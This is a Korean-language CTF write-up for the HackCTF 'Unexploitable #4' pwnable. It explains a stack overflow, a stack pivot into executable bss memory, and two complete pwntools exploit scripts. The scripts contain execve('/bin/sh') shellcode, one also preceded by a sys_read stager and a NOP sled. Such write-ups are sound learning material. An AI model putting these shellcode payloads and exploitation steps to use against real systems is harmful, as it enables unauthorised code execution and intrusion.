---
layout: post
title:  "HacCTF Unexploitable #4 write-up"
date:   2020-03-21 19:45:55
image:  hackctf_unex4.PNG
tags:   [Hackctf]
categories: [Write-up]
---

# [HackCTF] Unexploitable #4

Date: Feb 03, 2020
Tags: report


### 1.  문제

---

**1) mitigation 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%204/Untitled.png)

이번 문제는 Unexploitable의 마지막 4번째 시리즈이다. 특이하게 모든 보호기법이 안걸려 있고 또한 rwx 권한으로 코드영역의 실행이 가능하다 


**2) 문제 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%204/Untitled%201.png)


해당 바이너리를 바로 입력을 받고 종료가 된다. 아이다로 확인해보자

**3) 코드흐름 파악**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%204/Untitled%202.png)

코드는 fgets함수가 끝이다. 위에 sub_40066d는 setvbuf 함수가 내부적으로 호출된다. 환경세팅이라 신경안써도 된다.

fgets에서는 총 44바이트를 입력을 받는데, 현재 버퍼의 위치가 rbp-0x10 이므로 ret를 덮을 수 있다.



### 2. 접근방법

---

처음에는 csu 가젯도 존재하기 때문에 세번째 인자를 stdout으로 바꿔서 출력하면 되지 않을까? 해서 진행하였지만, 생각해보니 44바이트로는 턱도 없었다. 따라서 다른 방법으로 시도해야했다.

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%204/Untitled%203.png)

현재 rwx 권한이 가진 곳이 매우 많다.  0x601000 부터 0x602000 까지 rwx 권한이 다 있기 때문에 해당 영역에 쉘코드를 삽입하는 방식으로 진행해야 한다.


- **첫번째 시나리오**
    1. fgets는 rbp-0x10 값을 참조하여 해당 위치에 데이터를 집어넣는다. 따라서 bof을 일으켜 rbp값을 bss+0x10 로 변경한뒤, ret에 0x4006DB 을 주어서 다시 fgets를 입력받게 한다.
    2. 이번 fgets는 rbp가 변경됬으므로 bss영역에 값이 들어갈 것이다. 해당 영역에 23바이트 짜리 쉘코드를 넣고 ret를 쉘코드가 들어간 주소로 돌린다
    3. 2번이 진행되고 ret가 진행되어 쉘코드영역으로 돌아가면 쉘이 떨어질것이다.

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%204/Untitled%204.png)

    첫번쨰 시나리오 대로 실행하면 처음에 정상적으로 bss영역에 쉘코드가 들어가긴한다. 그리고 bss로 ret하여 쉘코드가 실행되는데 ni로 실행을 시키는 도중 에러가 발생한다. 그 이유는 현재 RSP와 RIP 값이 충돌하기 때문이다. 

    일반적으로 인터넷에 있는 64bit 쉘코드들은 push, pop 연산을 이용하여 스택에 값을 저장하고 빼는데, 이 연산때문에 RSP값이 RIP 값과 충돌하는 것이다.

    따라서 롸업과 인터넷을 찾아본 결과 쉘코드 24바이트를 쪼개서 넣는 방법으로 진행하면 된다고 한다..!



- **두번째 시나리오**
    1. fgets는 rbp-0x10 값을 참조하여 해당 위치에 데이터를 집어넣는다. 따라서 bof을 일으켜 rbp값을 bss+0x10 로 변경한뒤, ret에 0x4006DB 을 주어서 다시 fgets를 입력받게 한다.
    2. 24바이트 중 8바이트를 입력한다.

        ⇒ 더미(0x10)+rbp(기존rbp+88)+ret(fgets)+쉘코드8바이트

    3. 다음 입력으로 나머지 16바이트를 입력한다

        ⇒ 쉘코드16바이트 + 더미(8) + ret(쉘코드주소)

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%204/Untitled%205.png)

    현재 0x601170부터 24바이트의 쉘코드가 잘 들어가 있고 ret를 0x601170으로 돌려서 쉘코드가 실행되게 한다. 현재 rsp는 0x601198 이고 rip는 0x601170이다. 쉘코드를 계속 실행시켜보자

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%204/Untitled%206.png)

    하지만 이역시 똑같은 에러를 발생시킨다. 위에 보면 push와 pop 연산이 너무 많다. 따라서 현재 RSP와 RIP가 또충돌하게된다. 해당 쉘코드를 사용하지 말고 push와 pop 연산이 제외된 쉘코드를 만들어서 사용해야한다.

    마지막에 입력할때는 ret에 쉘코드가 들어있는 주소만 넣으면 되므로 rbp를 수정할 필요가 없다. 따라서 쉘코드는 처음 8바이트 입력하고 그다음 16바이트+rbp위치까지 8바이트 해서 총 32바이트까지 입력가능하다. push와 pop 연산이 최대한 배제된 쉘코드는 다음을 참조하였다.

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%204/Untitled%207.png)

*출처 : [https://powerco3e-lch.tistory.com/92](https://powerco3e-lch.tistory.com/92)*

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%204/Untitled%208.png)

요렇게 pwntools의 기능으로 쉘코드를 만들면 총 31바이트가 나온다. 따라서 ljst로 왼쪽 정렬시켰다.


- **3번째 시나리오**
    1. fgets는 rbp-0x10 값을 참조하여 해당 위치에 데이터를 집어넣는다. 따라서 bof을 일으켜 rbp값을 bss+0x10 로 변경한뒤, ret에 0x4006DB 을 주어서 다시 fgets를 입력받게 한다.
    2. 위에서 만든 쉘코드를 2번째 시나리오와 같은 방법으로 8바이트 삽입한다
    3. 나머지 24바이트를 삽입하고 ret를 쉘코드의 위치로 돌린다

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%204/Untitled%209.png)

정상적으로 쉘코드(32바이트)가 삽입되었고, 해당 위치로 갔다. 이제 쉘코드를 라인별로 실행하는데 기존 쉘코드와는 다르게 push와 pop이 거의 없으므로 syscall이 실행될때 까지 정상작동한다.

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%204/Untitled%2010.png)

RSP와 RIP가 충돌이 나지 않는 것을 확인할 수 있다.



### 3. 풀이

---

최종익스코드는 다음과 같다

    from pwn import *
    context.log_level="DEBUG"
    context.arch = 'amd64'
    #p=remote("ctf.j0n9hyun.xyz",3039)
    p=process("./Unexploitable_4")
    e=ELF("./Unexploitable_4")
    gdb.attach(p)
    
    shell="xor rax,rax; xor rdx,rdx; xor rsi,rsi; mov rbx,0x1068732f6e69622f;"
    shell +="push rbx; mov [rsp+7],al; mov rdi,rsp;mov al,0x3b;syscall;"
    s=asm(shell)
    s=s.ljust(0x20)
    
    payload = "A"*0x10+p64(0x601160)+p64(0x4006db)
    pause()
    p.sendline(payload)
    log.info(len(asm(shell)))
    s=asm(shell)
    s=s.ljust(0x20)
    payload2 = "A"*0x10+p64(0x601188)+p64(0x4006db)+s[:8]
    pause()
    p.sendline(payload2)
    
    payload3 = s[8:]+p64(0x601170)
    pause()
    p.sendline(payload3)
    
    p.interactive()



### 4. 몰랐던 개념

---

- 쉘코드를 가져다 쓰기만했지 직접 만들어보지는 않았다. 하지만 윈도우 환경의 쉘코드는 만들어봤기 때문에 리눅스는 금방 익혔다.
- 이렇게 직접 쉘코드를 짜서 문제를 해결해야하는 문제들이 있다고 한다. 이번 기회를 통해 새롭게 알게 되어서 다행이다.



### 5. 다른 풀이

---

추가적으로 새롭게 알게된 풀이가 있다.

우리가 처음에 fgets로 입력을 받는 것에 사이즈 제한이 있었다. 따라서 쉘코드 중 execve를 실행시키기 위해 필요한 문자열을 세팅한다. 

따라서 처음에 바로 execve를 띄우는 쉘코드를 삽입하지 말고 sys_read를 호출하는 쉘코드를 삽입하면 입력 사이즈 제한을 우회할 수 있기 때문에 이 sys_read함수를 이용해서 이때 쉘코드를 입력하면 원하는 사이즈 만큼 입력이 가능하다.

- 기존 풀이 : fgets → execve실행쉘
- 다른 풀이 : fgets → read호출 쉘 → execve실행 쉘(기존 인터넷에 있는)

read함수를 호출하는 쉘코드는 다음을 이용하였다.

- shellcode= "mov esi, 0x6010c0; mov edx, 0x400; syscall; ret;"

![HackCTF%20Unexploitable%204/Untitled%2011.png](HackCTF%20Unexploitable%204/Untitled%2011.png)

위 사진은 sys_read 쉘코드로 ret된 상황이다. 운좋게 rax가 이때 0인것을 확인했기 때문에 execve쉘코드를 저장할 rsi 주소만 주고, 사이즈를 크게 0x400정도 주었다.

![HackCTF%20Unexploitable%204/Untitled%2012.png](HackCTF%20Unexploitable%204/Untitled%2012.png)

그렇게 되면 0x6010c0의 주소에 쉘코드가 정상적으로 들어가게 되고 실행이 된다.

최종 익스코드는 다음과 같다

    from pwn import *
    import time
    #p=remote("ctf.j0n9hyun.xyz",3039)
    p=process('Unexploitable_4')
    gdb.attach(p)
    bss=p64(0x601090)
    read=p64(0x4006DB )
    payload = "A"*0x10
    payload+= bss
    payload+= read#ret
    payload+=bss
    p.sendline(payload)
    #time.sleep(2)
    #gdb.attach(p)
    pause()
    
    shellcode= "mov esi,0x6010c0;mov edx,0x400;syscall;ret;"
    payload = asm(shellcode)
    payload = payload.ljust(0x18)
    payload += p64(0x601080)
    payload += p64(0x6010c0)
    p.sendline(payload)
    
    pause()
    shell ="\x90"*0x200
    shell+="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
    p.sendline(shell)
    
    p.interactive()